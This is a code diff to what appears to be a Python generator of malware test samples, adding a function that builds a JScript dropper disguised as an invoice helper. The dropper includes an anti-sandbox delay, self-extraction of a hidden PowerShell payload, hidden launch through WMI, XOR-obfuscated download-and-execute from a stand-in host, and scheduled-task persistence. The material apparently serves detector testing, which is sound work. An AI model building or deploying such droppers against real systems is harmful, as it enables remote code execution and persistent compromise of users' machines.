@@ -1108,6 +1108,51 @@ new ActiveXObject("WScript.Shell").Run("wscript.exe //B " + p, 0, false);
     return js.encode("utf-8")
 
 
+def wsh_selfread_dropper_js() -> bytes:
+    """JScript dropper with the WSH tricks real loaders use (inert):
+    a Sleep + clock-delta anti-sandbox check, it reads ITSELF (ScriptFullName)
+    to pull a payload hidden in a trailing comment, writes it as a .ps1 with
+    FileSystemObject and launches it hidden through WMI Win32_Process.Create.
+    The .ps1 hides its strings in XOR'ed number arrays held in variables and
+    in a hex-decoder helper, and registers a logon scheduled task."""
+    def xr(t: str, k: int) -> str:
+        return ",".join(f"{ord(c) ^ k:03d}" for c in t)
+
+    def hx(t: str) -> str:
+        return t.encode().hex().upper()
+
+    ps = "\r\n".join([
+        "# invoice-2024-0613 sync agent",
+        f"$r1=@({xr('IEX (New-Object Net.WebClient).DownloadString(\'http://billing-portal.example/inv/stage5.ps1\')', 70)})",
+        "$rk1=070",
+        "$rs1=-join($r1|ForEach-Object{[char]([int]$_-bxor$rk1)})",
+        "$h2s = { param($h) $o=New-Object Text.StringBuilder; $i=0; while($i-lt$h.Length){ "
+        "[void]$o.Append([char][Convert]::ToInt32($h.Substring($i,2),16)); $i+=2 } $o.ToString() }",
+        f"$svc = & $h2s '{hx('Schedule.Service')}'",
+        f"$cmd = & $h2s '{hx('<Exec><Command>wscript.exe</Command><Arguments>//B //NoLogo "%LOCALAPPDATA%\\InvoiceSync\\manifest.js"</Arguments></Exec>')}'",
+        "$ts = New-Object -ComObject $svc; $ts.Connect()",
+        "$null = $ts.GetFolder('\\').RegisterTask('\\InvoiceSync42', $cmd, 6, $null, $null, 3, $null)",
+        "& ([scriptblock]::Create($rs1))",
+    ])
+    marker = "//PAYLOAD:"
+    js = f"""// invoice viewer helper
+var t0 = new Date().getTime();
+WScript.Sleep(4000);
+if (new Date().getTime() - t0 < 3000) {{ WScript.Quit(); }}
+var fso = WScript.CreateObject("Scripting.FileSystemObject");
+var me = fso.OpenTextFile(WScript.ScriptFullName, 1).ReadAll();
+var body = me.substring(me.lastIndexOf("{marker}") + {len(marker)}).split("\\n").join("\\r\\n");
+var sh = WScript.CreateObject("WScript.Shell");
+var dir = sh.ExpandEnvironmentStrings("%TEMP%") + "\\\\invsync";
+fso.CreateFolder(dir);
+var f = fso.CreateTextFile(dir + "\\\\w20240613.ps1", true);
+f.Write(body); f.Close();
+var wmi = GetObject("winmgmts:root\\\\cimv2");
+wmi.Get("Win32_Process").Create("powershell -nop -w hidden -ep Bypass -f " + dir + "\\\\w20240613.ps1");
+"""
+    return (js + marker + ps.replace("\r\n", "\\n")).encode("utf-8")
+
+
 def build_all() -> dict[str, bytes]:
     out: dict[str, bytes] = {
         "sample.docx": word_docx(), "sample.docm": word_docm(),
@@ -1116,7 +1161,7 @@ def build_all() -> dict[str, bytes]:
         "sample.eml": eml_doc(), "sample.emlx": emlx_doc(), "sample.msg": msg_doc(),
         "sample_dropper.js": obf_js(), "sample_obfuscatorio.js": obf_obfuscatorio_js(),
         "sample_obf_techniques.js": obf_techniques_js(),
-        "sample_chain_dropper.js": chain_dropper_js(), "sample_xor_stager.ps1": xor_stager_ps1(),
+        "sample_chain_dropper.js": chain_dropper_js(), "sample_wsh_selfread.js": wsh_selfread_dropper_js(), "sample_xor_stager.ps1": xor_stager_ps1(),
         "sample_stage2.ps1": stage2_ps1(), "sample_dropper.vbs": dropper_vbs(),
         "sample_dropper.bat": dropper_bat(), "sample_ioc_noise.bat": ioc_noise_bat(), "sample_loader.hta": loader_hta(),
         "sample_shortcut.pdf.lnk": shortcut_lnk(), "sample_shortcut.url": internet_shortcut_url(),
